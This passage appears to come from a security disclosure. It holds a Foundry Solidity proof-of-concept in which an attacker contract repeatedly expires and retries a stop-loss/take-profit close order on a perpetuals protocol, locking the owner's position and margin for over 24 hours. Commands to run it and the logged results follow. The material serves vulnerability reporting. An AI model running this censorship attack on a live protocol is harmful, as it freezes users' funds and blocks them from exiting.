            "the EOA must be able to terminalize the stale child before expiry"
        );
        assertEq(
            uint8(protectionViews.getPositionProtection(fixture.protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "the EOA's first transaction must expose Latched"
        );
        currentChildId = attacker.retry(protectionActions, fixture.protectionId);
        _assertReplacementMaintainsLock(fixture, currentChildId);
        _assertOwnerRecoveryBlocked(fixture, currentChildId);

        uint256 censorshipStartedAt = vm.getBlockTimestamp();
        uint256 renewalStepSeconds = router.maxExecutionWindowSeconds() + 1;
        uint256 censorshipCycles = (24 hours / renewalStepSeconds) + 1;

        // Exercise and measure one complete renewal with normal gas metering before the long-duration harness loop.
        uint256 renewalCallGas;
        (currentChildId, renewalCallGas) = _renewExpiredChild(fixture, currentChildId);
        assertGt(renewalCallGas, 0, "the measured renewal must consume gas");
        emit log_named_uint("single expire-and-retry call gas", renewalCallGas);

        // Foundry executes the whole test as one outer transaction, while the remaining loop models distinct attacker
        // transactions. Pause only aggregate metering so the synthetic outer gas ceiling does not truncate the sequence;
        // each iteration still executes the complete production call path and advances both time and block number.
        vm.pauseGasMetering();
        for (uint256 i = 1; i < censorshipCycles; ++i) {
            (currentChildId,) = _renewExpiredChild(fixture, currentChildId);
        }
        vm.resumeGasMetering();

        uint256 censorshipDuration = vm.getBlockTimestamp() - censorshipStartedAt;
        assertEq(
            censorshipDuration,
            censorshipCycles * renewalStepSeconds,
            "each atomic renewal must extend censorship through one fresh deadline"
        );
        assertGt(censorshipDuration, 24 hours, "the demonstrated owner lock must exceed the High threshold");
        emit log_named_uint("permissionless renewal cycles", censorshipCycles);
        emit log_named_uint("elapsed censorship seconds", censorshipDuration);
        emit log_named_uint("latest replacement child id", currentChildId);
        emit log_named_uint("locked position size", fixture.openedSize);
        emit log_named_uint("locked live margin assets", fixture.liveMarginAssets);
        emit log_named_uint("stale execution notional ceiling", fixture.staleNotionalCeilingAssets);
        emit log_named_uint("current execution notional", _positionNotional(fixture.openedSize, FAILURE_PRICE));
        _assertOwnerRecoveryBlocked(fixture, currentChildId);
        assertFalse(
            publicLens.isLiquidatable(fixture.account), "the demonstrated freeze must not depend on liquidation"
        );

        // Honest control: once the attacker stops consuming Latched, the owner can amend the stale ceiling and exit.
        uint64 finalAttackDeadline = router.lifecycleBook().orderTiming(currentChildId).executionDeadline;
        vm.warp(uint256(finalAttackDeadline) + 1);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory finalExpiry = router.expireOrder(currentChildId);
        assertEq(uint8(finalExpiry.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
        assertEq(
            router.pendingOrderCounts(fixture.account), 0, "stopping the retry finally exposes zero pending children"
        );
        assertEq(
            uint8(protectionViews.getPositionProtection(fixture.protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "stopping the retry finally exposes the owner's amendment state"
        );

        PositionProtectionTypes.CloseFinancialLimits memory repairedLimits =
            _closeLimits(_currentPositionNotionalAt(fixture.account, FAILURE_PRICE));
        vm.prank(fixture.account);
        protectionActions.amendLatchedPositionProtectionCloseLimits(fixture.protectionId, repairedLimits);

        uint64 repairedChildId = attacker.retry(protectionActions, fixture.protectionId);
        assertEq(
            router.lifecycleBook().pendingPolicy(repairedChildId).maxExecutionNotionalAssets,
            repairedLimits.maxExecutionNotionalAssets,
            "the first uncensored retry must use the owner's repaired ceiling"
        );

        uint256 freeBalanceBeforeClose = clearinghouse.balanceAssets(fixture.account);
        bytes[] memory repairedExecutionData = _mockPythUpdateData(FAILURE_PRICE);
        uint256 repairedExecutionFee = router.pletherOracle().getOrderExecutionFee(repairedExecutionData);
        vm.deal(KEEPER, repairedExecutionFee);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory executed =
            router.executeOrder{value: repairedExecutionFee}(repairedChildId, repairedExecutionData);
        assertEq(uint8(executed.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry must execute");
        (uint256 remainingSize, uint256 remainingPositionMargin,,,,,) = engine.positions(fixture.account);
        assertEq(remainingSize, 0, "the control must fully close the previously censored position");
        assertEq(remainingPositionMargin, 0, "the control must release all stored position margin");
        assertEq(
            protectionViews.activePositionProtectionId(fixture.account),
            0,
            "successful control must clear the trade lock"
        );
        assertEq(
            uint8(protectionViews.getPositionProtection(fixture.protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Executed),
            "successful control must terminalize the protection"
        );

        uint256 freeBalanceAfterClose = clearinghouse.balanceAssets(fixture.account);
        assertGt(freeBalanceAfterClose, freeBalanceBeforeClose, "successful close must release recoverable settlement");
        uint256 releasedSettlementAssets = freeBalanceAfterClose - freeBalanceBeforeClose;
        uint256 walletBalanceBefore = settlementToken.balanceOf(fixture.account);
        vm.prank(fixture.account);
        clearinghouse.withdrawMargin(releasedSettlementAssets);
        assertEq(
            settlementToken.balanceOf(fixture.account) - walletBalanceBefore,
            releasedSettlementAssets,
            "the control must make released settlement withdrawable to the owner"
        );
        emit log_named_uint("recoverable settlement released after censorship", releasedSettlementAssets);
    }

    function test_ContractOwnerCanAtomicallyRecoverWhenItsBundleIsSequencedFirst() public {
        AttackFixture memory fixture = _openShortAndTriggerStaleProtection(address(ownerWallet));

        baseMockPyth.setFee(PYTH_FEE);
        vm.deal(address(this), 1 ether);
        bytes[] memory failingExecutionData = _mockPythUpdateData(FAILURE_PRICE);
        uint256 executionFee = router.pletherOracle().getOrderExecutionFee(failingExecutionData);
        (, uint64 currentChildId) = attacker.executeFailingAttemptAndRetry{value: executionFee}(
            OrderRouter(address(router)),
            protectionActions,
            fixture.protectionId,
            fixture.firstChildId,
            failingExecutionData
        );

        uint64 deadline = router.lifecycleBook().orderTiming(currentChildId).executionDeadline;
        vm.warp(uint256(deadline) + 1);
        vm.roll(vm.getBlockNumber() + 1);
        PositionProtectionTypes.CloseFinancialLimits memory repairedLimits =
            _closeLimits(_currentPositionNotionalAt(fixture.account, FAILURE_PRICE));
        (OrderV3Types.ExecutionResult memory expired, uint64 repairedChildId) = ownerWallet.expireAmendAndRetry(
            OrderRouter(address(router)), protectionActions, fixture.protectionId, currentChildId, repairedLimits
        );

        assertEq(uint8(expired.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
        assertEq(
            router.lifecycleBook().pendingPolicy(repairedChildId).maxExecutionNotionalAssets,
            repairedLimits.maxExecutionNotionalAssets,
            "a contract owner sequenced first must atomically install its repaired limit"
        );
        assertEq(
            uint8(protectionViews.getPositionProtection(fixture.protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "the owner bundle must leave one repaired live child"
        );
    }

    function _openShortAndTriggerStaleProtection(
        address account
    ) internal returns (AttackFixture memory fixture) {
        fixture.account = account;
        _fundTrader(account, 20_000e6);
        _executeBoundedOrder(account, CfdTypes.Side.SHORT, POSITION_SIZE, POSITION_MARGIN_ASSETS, ENTRY_PRICE, false);
        router.updateMarkPrice(_mockPythUpdateData(ENTRY_PRICE));

        (fixture.openedSize, fixture.liveMarginAssets,,,,,) = engine.positions(account);
        assertEq(fixture.openedSize, POSITION_SIZE, "public order lifecycle must create the intended position");
        assertGt(fixture.liveMarginAssets, 0, "the opened position must retain live margin");

        // The ceiling has one percent headroom over the configured trigger notional, so the first child is genuinely
        // executable when queued. A later price move, not the owner's original configuration, makes it obsolete.
        uint256 triggerNotionalAssets = _positionNotional(fixture.openedSize, TRIGGER_PRICE);
        fixture.staleNotionalCeilingAssets = triggerNotionalAssets + (triggerNotionalAssets / 100);
        assertGt(
            fixture.staleNotionalCeilingAssets,
            triggerNotionalAssets,
            "the retained ceiling must be usable at the configured trigger price"
        );
        assertGt(
            _positionNotional(fixture.openedSize, FAILURE_PRICE),
            fixture.staleNotionalCeilingAssets,
            "a later price move must make the previously valid ceiling unusable"
        );

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.takeProfitTriggerPrice = TRIGGER_PRICE;
        params.closeLimits = _closeLimits(fixture.staleNotionalCeilingAssets);

        vm.prank(account);
        fixture.protectionId = protectionActions.createPositionProtection(params);
        assertEq(
            uint8(protectionViews.getPositionProtection(fixture.protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Armed),
            "real protection creation must arm against the opened position"
        );

        bytes[] memory triggerData = _mockPythUpdateData(TRIGGER_PRICE);
        vm.prank(KEEPER);
        fixture.firstChildId = protectionActions.triggerPositionProtection(fixture.protectionId, triggerData);
        assertEq(router.pendingOrderCounts(account), 1, "trigger must queue exactly one real close child");

        _proveOriginalChildExecutableAtTrigger(fixture);
    }

    function _proveOriginalChildExecutableAtTrigger(
        AttackFixture memory fixture
    ) internal {
        uint256 snapshot = vm.snapshotState();
        bytes[] memory executableData = _mockPythUpdateData(TRIGGER_PRICE);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory control = router.executeOrder(fixture.firstChildId, executableData);
        assertEq(
            uint8(control.status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "control: the original retained ceiling must permit execution at the trigger price"
        );
        (uint256 remainingSize,,,,,,) = engine.positions(fixture.account);
        assertEq(remainingSize, 0, "control: the original child must be economically executable when queued");
        assertTrue(vm.revertToStateAndDelete(snapshot), "control branch must restore the attack fixture");
        assertEq(
            router.lifecycleBook().pendingPolicy(fixture.firstChildId).maxExecutionNotionalAssets,
            fixture.staleNotionalCeilingAssets,
            "restored child must retain the originally usable ceiling"
        );
    }

    function _renewExpiredChild(
        AttackFixture memory fixture,
        uint64 expiredChildId
    ) internal returns (uint64 replacementChildId, uint256 callGas) {
        uint64 oldDeadline = router.lifecycleBook().orderTiming(expiredChildId).executionDeadline;
        vm.warp(uint256(oldDeadline) + 1);
        vm.roll(vm.getBlockNumber() + 1);

        uint256 gasBefore = gasleft();
        (OrderV3Types.ExecutionResult memory expired, uint64 replacementId) = attacker.expireAndRetry(
            OrderRouter(address(router)), protectionActions, fixture.protectionId, expiredChildId
        );
        callGas = gasBefore - gasleft();
        replacementChildId = replacementId;

        assertEq(uint8(expired.status), uint8(OrderV3Types.LifecycleStatus.Failed), "expiry must terminalize child");
        assertEq(
            uint8(expired.terminalReason),
            uint8(OrderV3Types.TerminalReason.Expired),
            "deadline cleanup must record canonical expiry"
        );
        assertGt(replacementChildId, expiredChildId, "every retry must consume a fresh permanent order id");
        assertGt(
            router.lifecycleBook().orderTiming(replacementChildId).executionDeadline,
            oldDeadline,
            "every retry must create a fresh execution window"
        );
        OrderV3Types.TerminalOutcome memory terminal = router.lifecycleBook().terminalOutcome(expiredChildId);
        assertEq(
            uint8(terminal.status),
            uint8(OrderV3Types.LifecycleStatus.Failed),
            "the old child must remain permanently terminal"
        );
        assertEq(
            uint8(terminal.reason),
            uint8(OrderV3Types.TerminalReason.Expired),
            "the old child must remain permanently expired"
        );
        _assertReplacementMaintainsLock(fixture, replacementChildId);
    }

    function _assertReplacementMaintainsLock(AttackFixture memory fixture, uint64 currentChildId) internal view {
        PositionProtectionTypes.PositionProtectionView memory protection =
            protectionViews.getPositionProtection(fixture.protectionId);
        assertEq(
            uint8(protection.status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "atomic retry must consume Latched before control returns"
        );
        assertEq(protection.linkedOrderId, currentChildId, "Book must point at the attacker's newest child");
        assertEq(
            protectionViews.activePositionProtectionId(fixture.account),
            fixture.protectionId,
            "trade lock must remain active"
        );
        assertEq(
            router.pendingOrderCounts(fixture.account),
            1,
            "remove-before-insert must keep the live count at exactly one"
        );
        assertEq(
            router.pendingCloseSize(fixture.account),
            fixture.openedSize,
            "the newest child must reserve the full close size"
        );
        assertEq(
            router.lifecycleBook().pendingIntent(currentChildId).executionBountyAssets,
            0,
            "every replacement child must retain zero order-execution bounty"
        );
        assertEq(
            router.lifecycleBook().pendingPolicy(currentChildId).maxExecutionNotionalAssets,
            fixture.staleNotionalCeilingAssets,
            "every replacement child must copy the obsolete retained notional ceiling"
        );
        assertEq(
            protectionViews.closeFinancialLimits(fixture.protectionId).maxExecutionNotionalAssets,
            fixture.staleNotionalCeilingAssets,
            "permissionless retry must retain the owner's obsolete ceiling"
        );
        (uint256 currentSize, uint256 currentMargin,,,,,) = engine.positions(fixture.account);
        assertEq(currentSize, fixture.openedSize, "censorship cycles must preserve the entire position");
        assertEq(currentMargin, fixture.liveMarginAssets, "censorship cycles must preserve live position margin");
    }

    function _assertOwnerRecoveryBlocked(AttackFixture memory fixture, uint64 currentChildId) internal {
        PositionProtectionTypes.CloseFinancialLimits memory repairedLimits =
            _closeLimits(_currentPositionNotionalAt(fixture.account, FAILURE_PRICE));
        OrderV3Types.OrderRequest memory ordinaryClose =
            _boundedRequest(fixture.account, CfdTypes.Side.SHORT, fixture.openedSize, 0, 1, true);

        vm.startPrank(fixture.account);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(fixture.protectionId, repairedLimits);

        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(fixture.protectionId);

        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(fixture.protectionId, ordinaryClose);

        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(ordinaryClose);
        vm.stopPrank();

        assertEq(
            protectionViews.getPositionProtection(fixture.protectionId).linkedOrderId,
            currentChildId,
            "failed owner recovery calls must leave the attacker's child intact"
        );
    }

    function _executeBoundedOrder(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price,
        bool isClose
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request = _boundedRequest(account, side, size, margin, price, isClose);
        vm.prank(account);
        orderId = router.commitOrder(request);

        bytes[] memory executionData = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public V3 order must execute");
    }

    function _boundedRequest(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId =
            keccak256(abi.encode(account, side, size, margin, targetPrice, isClose, router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = targetPrice;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _closeLimits(
        uint256 maxExecutionNotionalAssets
    ) internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits.maxExecutionNotionalAssets = maxExecutionNotionalAssets;
        limits.maxGrossAccountDebitAssets = type(uint256).max;
        limits.maxActionChargeAssets = type(uint256).max;
        limits.maxExplicitFeesAssets = type(uint256).max;
    }

    function _currentPositionNotionalAt(
        address account,
        uint256 price
    ) internal view returns (uint256 notionalAssets) {
        (uint256 size,,,,,,) = engine.positions(account);
        return _positionNotional(size, price);
    }

    function _positionNotional(uint256 size, uint256 price) internal pure returns (uint256 notionalAssets) {
        return (size * price) / 1e20;
    }

}
~~~

3. Format-check the added file from the repository root:

~~~bash
forge fmt --check packages/perps/test/perps/regression/PermissionlessProtectionRetryCensorship.t.sol
~~~

4. Run the focused PoC from the repository root:

~~~bash
forge test \
  --root packages/perps \
  --match-path test/perps/regression/PermissionlessProtectionRetryCensorship.t.sol \
  -vv
~~~

### Expected result

~~~text
Ran 2 tests for test/perps/regression/PermissionlessProtectionRetryCensorship.t.sol:PermissionlessProtectionRetryCensorshipRegressionTest
[PASS] test_AtomicPermissionlessRetriesCensorOwnerRecoveryUntilAttackerStops()
Logs:
  single expire-and-retry call gas: 925161
  permissionless renewal cycles: 1417
  elapsed censorship seconds: 86437
  latest replacement child id: 1421
  locked position size: 10000000000000000000000
  locked live margin assets: 1986000000
  stale execution notional ceiling: 10605000000
  current execution notional: 11000000000
  recoverable settlement released after censorship: 995591318

[PASS] test_ContractOwnerCanAtomicallyRecoverWhenItsBundleIsSequencedFirst()
Suite result: ok. 2 passed; 0 failed; 0 skipped
~~~

The first complete `expireOrder + retryPositionProtectionClose` renewal runs with normal gas metering and records its call-path gas. `vm.pauseGasMetering()` is then used only around the remaining 1,416-iteration harness loop because Foundry represents the entire test as one synthetic outer transaction, while the attack consists of separate on-chain transactions over more than 24 hours. It does not skip or replace any protocol operation: every iteration still executes the real atomic expiry and retry, advances both timestamp and block number, and runs all lifecycle assertions against the production contracts.
